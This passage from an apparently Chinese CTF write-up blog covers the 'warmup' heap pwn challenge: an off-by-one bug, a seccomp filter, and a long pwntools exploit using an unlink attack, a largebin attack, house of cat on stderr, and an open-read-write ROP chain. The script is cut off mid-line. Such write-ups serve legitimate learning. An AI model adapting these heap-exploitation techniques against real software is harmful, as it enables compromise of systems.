class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3<span class="number">.5</span>)</span> stable release version 2.35.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">warmup: ELF <span class="number">64</span>-bit LSB pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=b5eb1d744b7c4d95ceafe7ff2e89f659cab2f9bc, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000000c</span>  <span class="keyword">if</span> (A == brk) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"><span class="number">0012</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>有 off-by-one 漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk_list[i][(<span class="keyword">int</span>)read(<span class="number">0</span>, chunk_list[i], size)] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>核心考点为无泄露 unlink attack，可以考虑如下的堆风水：</p>
<ul>
<li>获取两个 unsorted chunk 进行合并，其中的第二个 chunk 末地址必须为 <code>\x00</code>（遗留下 FD BK 指针）</li>
<li>重新申请大 unsorted chunk 后释放（不破坏原来的 heap 结构），然后再次进行分割，使第二个 chunk 的末尾地址为 <code>\x30</code> 或者 <code>\x40</code> <code>\x50</code> 等等（有一定偏移的地址都可以）</li>
<li>之后利用 unsortedbin 进行调整，在 FD-&gt;bk 和 BK-&gt;fd 中写入 <code>\x30</code>，然后覆盖为 <code>\x00</code></li>
</ul>
<p>由于该程序至少覆盖两字节，因此打 unlink 时只有 1/16 的概率可以打通（如果有更好的堆风水可以避免这一点）</p>
<p>最后劫持 <code>stderr</code> 打 house of cat 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./warmup1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">local = 1</span></span><br><span class="line"><span class="string">if local:</span></span><br><span class="line"><span class="string">    p = process(challenge)</span></span><br><span class="line"><span class="string">    #p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    p = remote(&#x27;119.13.105.35&#x27;,&#x27;10111&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase()\n&quot;)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data=<span class="string">&quot;\n&quot;</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;Note&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(index+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(index+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    add(<span class="number">0x52f0</span>) <span class="comment">#null</span></span><br><span class="line">    add(<span class="number">0x418</span>) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x1f0</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x428</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x438</span>) <span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x208</span>) <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x428</span>) <span class="comment">#5</span></span><br><span class="line">    add(<span class="number">0x208</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    dele(<span class="number">3</span>)</span><br><span class="line">    dele(<span class="number">5</span>)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="number">0x428</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xc91</span>)) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x418</span>) <span class="comment">#3 0x2b0</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x418</span>,<span class="string">&quot;\x00&quot;</span>) <span class="comment">#2 0xd20 - over \x00 to bk/fd</span></span><br><span class="line">    add(<span class="number">0x428</span>) <span class="comment">#5 0x370</span></span><br><span class="line"></span><br><span class="line">    dele(<span class="number">3</span>) <span class="comment"># 0x2b0 - bk=0xd20</span></span><br><span class="line">    dele(<span class="number">2</span>) <span class="comment"># 0xd20</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x418</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment">#2 修复fd-&gt;bk(低位覆盖\x00)</span></span><br><span class="line">    add(<span class="number">0x418</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">    dele(<span class="number">3</span>) <span class="comment"># 0xd20</span></span><br><span class="line">    dele(<span class="number">5</span>) <span class="comment"># 0x350 - fd=0xd20</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x9f8</span>) <span class="comment">#3 make 0x350 to large </span></span><br><span class="line">    add(<span class="number">0x428</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#5 修复bk-&gt;fd(低位覆盖\x00)</span></span><br><span class="line"></span><br><span class="line">    dele(<span class="number">6</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    add(<span class="number">0x208</span>,<span class="number">0x200</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xc90</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x418</span>) <span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x208</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    dele(<span class="number">3</span>) <span class="comment"># unlink</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x430</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,p64(<span class="number">0x421</span>))) <span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x1600</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">    show(<span class="number">4</span>)</span><br><span class="line">    ru(<span class="string">&quot;Note: &quot;</span>)</span><br><span class="line">    leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base=leak_addr-<span class="number">0x21a310</span></span><br><span class="line">    success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    show(<span class="number">5</span>)</span><br><span class="line">    ru(<span class="string">&quot;Note: &quot;</span>)</span><br><span class="line">    leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap=leak_addr-<span class="number">0x55b0</span></span><br><span class="line">    success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">    setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">    open_libc=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    read_libc=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    write_libc=libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    success(<span class="string">&quot;setcontext &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(setcontext))</span><br><span class="line"></span><br><span class="line">    IO_list_all = libc_base+<span class="number">0x21a680</span></span><br><span class="line">    stderr=libc_base+libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">    stderr = libc_base+libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">    IO_wfile_jumps = libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">    _IO_stdfile_2_lock = libc_base+<span class="number">0x21ba60</span></span><br><span class="line">    success(<span class="string">&quot;IO_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">    success(<span class="string">&quot;stderr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stderr))</span><br><span class="line">    success(<span class="string">&quot;IO_wfile_jumps &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_wfile_jumps))</span><br><span class="line"></span><br><span class="line">    pop_rax_ret=<span class="number">0x0000000000045eb0</span>+libc_base</span><br><span class="line">    pop_rdi_ret=<span class="number">0x000000000002a3e5</span>+libc_base</span><br><span class="line">    pop_rsi_ret=<span class="number">0x000000000002be51</span>+libc_base</span><br><span class="line">    pop_rdx_ret=<span class="number">0x00000000000796a2</span>+libc_base</span><br><span class="line">    ret=<span class="number">0x0000000000029cd6</span>+libc_base</span><br><span class="line">    syscall_ret = <span class="number">0x0000000000114059</span>+libc_base</span><br><span class="line">    success(<span class="string">&quot;pop_rdi_ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rdi_ret))</span><br><span class="line">    success(<span class="string">&quot;pop_rsi_ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rsi_ret))</span><br><span class="line">    success(<span class="string">&quot;pop_rdx_ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rdx_ret))</span><br><span class="line">    success(<span class="string">&quot;ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(ret))</span><br><span class="line"></span><br><span class="line">    next_chain = <span class="number">0</span></span><br><span class="line">    fake_io_addr = heap + <span class="number">0x6650</span> - <span class="number">0x10</span></span><br><span class="line">    payload_addr = heap</span><br><span class="line">    success(<span class="string">&quot;fake_io_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(fake_io_addr))</span><br><span class="line"></span><br><span class="line">    ORW_addr = heap + <span class="number">0x5be0</span></span><br><span class="line">    flag_addr = heap + <span class="number">0x5be0</span> + <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">    fake_IO_FILE =  <span class="string">&quot;/bin/sh\x00&quot;</span>         <span class="comment">#_flags=rdi</span></span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">    fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">    fake_IO_FILE += p64(ORW_addr-<span class="number">0xa0</span>) <span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">    fake_IO_FILE += p64(setcontext) <span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">    fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">    fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(_IO_stdfile_2_lock)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">    fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">    fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>) <span class="comment">#mode=1</span></span><br><span class="line">    fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(IO_wfile_jumps+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">    fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>+<span class="number">0x20</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">    chain  = p64(ORW_addr)</span><br><span class="line">    <span class="comment"># open(heap_addr,0)</span></span><br><span class="line">    chain += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">    chain += p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">    chain += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">    chain += p64(pop_rdx_ret) + p64(<span class="number">0</span>) </span><br><span class="line">    chain += p64(syscall_ret)</span><br><span class="line">    <span class="comment"># read(3,heap_addr,0x60)</span></span><br><span class="line">    chain += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">    chain += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">    chain += p64(pop_rsi_ret) + p64(flag_addr)</span><br><span class="line">    chain += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>) </span><br><span class="line">    chain += p64(syscall_ret)</span><br><span class="line">    <span class="comment"># write(1,heap_addr,0x60)</span></span><br><span class="line">    chain += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">    chain += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">    chain += p64(pop_rsi_ret) + p64(flag_addr)</span><br><span class="line">    chain += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>) </span><br><span class="line">    chain += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">    chain = chain.ljust(<span class="number">0x200</span>,<span class="string">&#x27;\x00&#x27;</span>) </span><br><span class="line">    chain += <span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    add(<span class="number">0x800</span>,<span class="number">0x208</span>*<span class="string">&#x27;p&#x27;</span>+p64(<span class="number">0x431</span>)) <span class="comment">#11</span></span><br><span class="line">    add(<span class="number">0xa30</span>,<span class="number">0x38</span>*<span class="string">&quot;k&quot;</span>+p64(<span class="number">0xa01</span>)) <span class="comment"># padding-不要破坏原来的chunk结构</span></span><br><span class="line">    <span class="comment">#add(0x1240,0x208*&#x27;k&#x27;+p64(0x431)+0x428*&#x27;a&#x27;+p64(0x211)+0x208*&#x27;a&#x27;+p64(0xa01)+&quot;\n&quot;*6) # padding-不要破坏原来的chunk结构</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    </span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    success(<span class="string">&quot;chain len &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(chain)))</span><br><span class="line">    add(<span class="number">0x440</span>,chain+<span class="string">&quot;\n&quot;</span>*<span class="number">5</span>) <span class="comment"># 0-chain</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x418</span>) <span class="comment">#12</span></span><br><span class="line">    add(<span class="number">0x208</span>) <span class="comment">#13</span></span><br><span class="line">    dele(<span class="number">5</span>)</span><br><span class="line">    dele(<span class="number">4</span>)</span><br><span class="line">    dele(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    add(<span class="number">0x1240</span>,<span class="number">0x208</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x431</span>)+p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span>+p64(heap+<span class="number">0x1350</span>+<span class="number">0x52f0</span>+<span class="number">0x10</span>)+p64(stderr-<span class="number">0x20</span>)+<span class="string">&quot;\n&quot;</span>*<span class="number">6</span>) <span class="comment">#4</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># largebin attack</span></span><br><span class="line">    add(<span class="number">0x410</span>)</span><br><span class="line">    dele(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    sleep(<span 